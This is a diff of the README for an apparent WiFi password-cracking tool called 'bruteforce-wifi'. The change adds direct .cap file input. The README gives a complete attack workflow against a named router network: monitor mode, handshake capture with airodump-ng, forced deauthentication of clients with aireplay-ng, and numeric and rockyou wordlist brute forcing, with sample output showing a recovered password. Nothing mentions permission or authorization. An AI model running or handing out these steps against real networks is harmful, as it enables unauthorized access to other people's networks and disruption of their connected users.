@@ -32,44 +32,35 @@
 
 ## ⚡ Quick Start
 
-### Step 1: Capture a Handshake
+### Step 1: Capture WPA/WPA2 Handshake
 
 ```bash
 # Put WiFi interface in monitor mode (Linux)
 sudo airmon-ng start wlan0
 
-# Capture handshake
+# Capture handshake (this creates capture-01.cap file)
 sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
 
-# In another terminal, deauth a client to force handshake
+# In another terminal, deauth a client to force reconnection
 sudo aireplay-ng -0 2 -a 00:11:22:33:44:55 wlan0mon
 ```
 
-### Step 2: Convert to JSON (or create manually)
+### Step 2: Crack Offline (No Conversion Needed!)
 
-Create `handshake.json`:
-```json
-{
-  "ssid": "TP-Link_5GHz",
-  "ap_mac": [0, 17, 34, 51, 68, 85],
-  "client_mac": [170, 187, 204, 221, 238, 255],
-  "anonce": [1, 1, 1, ...],
-  "snonce": [2, 2, 2, ...],
-  "mic": [171, 205, ...],
-  "eapol_frame": [2, 0, ...],
-  "key_version": 2
-}
-```
-
-### Step 3: Crack Offline
+**Direct .cap file support** - no need to convert to JSON:
 
 ```bash
-# Numeric attack (8 digits)
-bruteforce-wifi crack numeric handshake.json --min 8 --max 8
+# Numeric attack (8 digits) with .cap file
+bruteforce-wifi crack numeric capture-01.cap --ssid "TP-Link_5GHz" --min 8 --max 8
 
-# Wordlist attack
-bruteforce-wifi crack wordlist handshake.json rockyou.txt
+# Wordlist attack with .cap file
+bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
+
+# Use JSON format (optional)
+bruteforce-wifi crack numeric handshake.json --min 8 --max 8
 ```
+
+**That's it!** The tool automatically parses .cap/.pcap files and extracts the handshake.
 
 ---
 
@@ -131,28 +122,21 @@ if calculated_MIC == captured_MIC:
 
 ### Scenario: Crack TP-Link Router with 8-Digit Password
 
-#### 1. Reconnaissance
+#### 1. Identify Target Network
+
+Use your system's WiFi tools or `iwlist scan` to find the target network:
 
 ```bash
-# List available networks
-sudo bruteforce-wifi list
+# Scan for networks (Linux)
+sudo iwlist wlan0 scan | grep -E "ESSID|Address|Channel"
 ```
 
-Output:
-```
-Available networks:
-#    SSID                  BSSID              Signal     Ch   Security
-─────────────────────────────────────────────────────────────────────
-1    TP-Link_5GHz          14:CC:20:XX:XX:XX    -45 dBm  Ch 6   WPA2 ✓ 85%
-2    NETGEAR24             00:1A:2B:XX:XX:XX    -55 dBm  Ch 11  WPA2 ✓ 70%
-3    MyHomeWiFi            AA:BB:CC:XX:XX:XX    -60 dBm  Ch 1   WPA2
+Find:
+- SSID: `TP-Link_5GHz`
+- BSSID (AP MAC): `14:CC:20:XX:XX:XX`
+- Channel: `6`
 
-Top networks most likely to have numeric passwords:
-  1. TP-Link_5GHz - Confidence: 85%
-  2. NETGEAR24 - Confidence: 70%
-```
-
-#### 2. Capture Handshake
+#### 2. Capture WPA/WPA2 Handshake
 
 **On Linux:**
 
@@ -173,36 +157,15 @@ sudo aireplay-ng -0 5 -a 14:CC:20:XX:XX:XX wlan0mon
 ```
 
 **On macOS/Windows:**
-Use Wireshark or a VM with Linux.
+Use Wireshark to capture packets or run a Linux VM with aircrack-ng tools.
 
-#### 3. Convert Handshake to JSON
+#### 3. Crack the Password
 
-For now, create `tp_link_handshake.json` manually with captured data:
-
-```json
-{
-  "ssid": "TP-Link_5GHz",
-  "ap_mac": [20, 204, 32, 88, 90, 92],
-  "client_mac": [170, 187, 204, 221, 238, 255],
-  "anonce": [/* 32 bytes from captured frame */],
-  "snonce": [/* 32 bytes from captured frame */],
-  "mic": [/* 16 bytes MIC */],
-  "eapol_frame": [/* EAPOL frame with MIC zeroed */],
-  "key_version": 2
-}
-```
-
-Or use the example generator:
-```bash
-cargo run --example create_test_handshake
-```
-
-#### 4. Crack the Password
-
-**Numeric attack (TP-Link typically uses 8 digits):**
+**Option 1: Numeric attack** (TP-Link typically uses 8 digits)
 
 ```bash
-bruteforce-wifi crack numeric tp_link_handshake.json --min 8 --max 8 --threads 8
+# Use .cap file directly with SSID
+bruteforce-wifi crack numeric capture-01.cap --ssid "TP-Link_5GHz" --min 8 --max 8 --threads 8
 ```
 
 Output:
@@ -232,17 +195,18 @@ Testing 100000000 combinations (8 digits)...
 
 Statistics:
   Attempts: 87,234,522
-  Duration: 3751.23s
+  Duration: 3751.23s (1.04 hours)
   Speed: 23,245 passwords/second
 ```
 
-**Wordlist attack:**
+**Option 2: Wordlist attack**
 
 ```bash
-# Download rockyou.txt or use your own wordlist
+# Download rockyou.txt wordlist
 wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 
-bruteforce-wifi crack wordlist tp_link_handshake.json rockyou.txt
+# Crack with wordlist
+bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
 ```
 
 ---
@@ -251,29 +215,24 @@ bruteforce-wifi crack wordlist tp_link_handshake.json rockyou.txt
 
 ### Offline Cracking Architecture
 
-- 🚀 **5,000-50,000 pwd/sec** - No network delays
-- 🔒 **Capture once, crack anywhere** - Work offline
-- 🧵 **Multi-threaded** - Uses all CPU cores
-- 📊 **Real-time progress** - Live throughput stats
-- 💾 **Low memory** - Efficient data structures
+- 🚀 **5,000-50,000 pwd/sec** - No network delays, pure CPU power
+- 🔒 **Capture once, crack anywhere** - Work completely offline
+- 🧵 **Multi-threaded** - Scales with CPU cores (optimal parallel processing)
+- 📊 **Real-time progress** - Live throughput stats and ETA
+- 💾 **Minimal memory** - ~15 MB footprint with zero-allocation crypto
+- 📦 **Direct .cap support** - No conversion needed, works with airodump-ng output
 
 ### Two Attack Modes
 
 1. **Wordlist Attack** - Test passwords from a file
    - Supports any text file (one password per line)
-   - Filters invalid passwords (WPA: 8-63 chars)
-   - Parallel processing
+   - Auto-filters invalid passwords (WPA: 8-63 chars)
+   - Parallel processing with rayon
 
-2. **Numeric Combination Attack** - Generate numeric passwords
-   - Range: 4-12 digits
-   - Optimized generation
-   - Smart batching
-
-### Network Intelligence
-
-- 🧠 **Auto-detect numeric passwords** - Identifies TP-Link, D-Link, etc.
-- 📡 **WiFi scanning** - List available networks
-- 🎯 **Confidence scores** - Ranks likelihood of numeric passwords
+2. **Numeric Combination Attack** - Generate numeric passwords on-the-fly
+   - Range: 1-12 digits
+   - Optimized batch generation
+   - Perfect for routers with default numeric passwords (TP-Link, D-Link, etc.)
 
 ### Cross-Platform Support
 
